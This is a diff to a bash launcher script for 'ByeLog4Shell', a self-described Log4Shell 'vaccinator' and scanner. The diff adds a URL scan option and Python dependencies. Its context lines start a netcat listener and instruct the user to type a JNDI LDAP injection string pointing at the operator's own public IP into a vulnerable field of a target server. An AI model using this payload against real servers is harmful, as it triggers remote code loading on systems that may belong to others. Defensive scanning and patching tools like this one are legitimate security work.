@@ -8,6 +8,7 @@ die() {
 usage() {                                 
   echo "Usage:  $0 -h | --help | Display This Usage Page
   	$0 -i | --install | Install ByeLog4Shell and its Dependencies
+  	$0 -s [URL] | --scan [URL] | Scan an Website for Log4Shell Vulnerability
         $0 -rp | --run-persistent | Run ByeLog4Shell in Persistent mode
         $0 -rt | --run-transient | Run ByeLog4Shell in Transient mode
         $0 -irt | --install-run-transient | Install and run ByeLog4Shell in Transient mode
@@ -17,9 +18,12 @@ exit_abnormal() {
   usage
   exit 1
 }
-install-runp() {
+irunp() {
 echo Installing and Running ByeLog4Shell in Persistent Mode
-sudo apt install -y maven netcat-traditional gnome-terminal
+sudo apt install -y maven netcat-traditional gnome-terminal pip3 python3
+cd ByeLog4ShellScanner
+sudo pip3 install -r requirements.txt
+cd ..
 cd ByeLog4ShellVaccinator
 mvn package
 cd ..
@@ -37,9 +41,12 @@ gnome-terminal -- nc -lvnp 80
 echo "Now enter "\${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a}" into a vulnerable field (such as user name) to Vaccinate a Server against Log4Shell Vulnerability"
 exit
 }
-install-runt() {
+irunt() {
 echo Installing and Running ByeLog4Shell in Transient Mode
-sudo apt install -y maven netcat-traditional gnome-terminal
+sudo apt install -y maven netcat-traditional gnome-terminal pip3 python3
+cd ByeLog4ShellScanner
+sudo pip3 install -r requirements.txt
+cd ..
 cd ByeLog4ShellVaccinator
 mvn package
 cd ..
@@ -59,7 +66,10 @@ exit
 }
 installb() {
 echo Installing Dependencies for ByeLog4Shell
-sudo apt install -y maven netcat-traditional gnome-terminal
+sudo apt install -y maven netcat-traditional gnome-terminal pip3 python3
+cd ByeLog4ShellScanner
+sudo pip3 install -r requirements.txt
+cd ..
 cd ByeLog4ShellVaccinator
 mvn package
 cd ..
@@ -117,14 +127,26 @@ while :; do
             ;;
         -irt|--install-run-transient)
         echo ByeLog4Shell By Qerim Iseni09
-        install-runt
+        irunt
             exit
             ;;
         -irp|--install-run-persistent)
         echo ByeLog4Shell By Qerim Iseni09
-        install-runp
+        irunp
             exit
             ;;
+        -s |--scan)
+        echo ByeLog4Shell By Qerim Iseni09
+        if [ -z "$2" ]
+        then
+      	echo "Error: Expected an Url"
+	else
+	cd ByeLog4ShellScanner
+	python3 Scanner.py -w -r -u $2
+	cd ..
+	exit
+	fi
+		;;
         -?*)
         echo ByeLog4Shell By Qerim Iseni09
             printf "WARN: Unknown option (ignored): %s\n" "$1" >&2
